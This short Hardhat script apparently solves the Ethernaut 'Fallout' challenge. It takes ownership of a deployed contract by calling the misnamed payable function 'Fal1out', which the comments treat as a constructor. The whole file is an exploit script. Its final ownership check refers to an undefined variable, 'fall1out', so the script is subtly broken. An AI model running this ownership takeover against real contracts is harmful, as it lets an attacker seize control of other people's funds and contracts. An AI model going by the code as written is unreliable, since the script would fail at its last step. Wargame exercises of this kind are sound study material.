const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async () => {
  const fall1outAddr = "0xaa98ab39b8e7733905B8ca7A85e79fe05D8f950B";

  const contract = await ethers.getContractAt("Fallout", fall1outAddr);

  // verity owner
  console.log(`Fallout contract owner: ${await contract.owner()}`);

  // call the payable contructor which will assign us as the owner
  await contract.Fal1out({ value: 1 });

  // check that we are the new owner
  console.log(`Fallout contract owner: ${await fall1out.owner()}`);
});
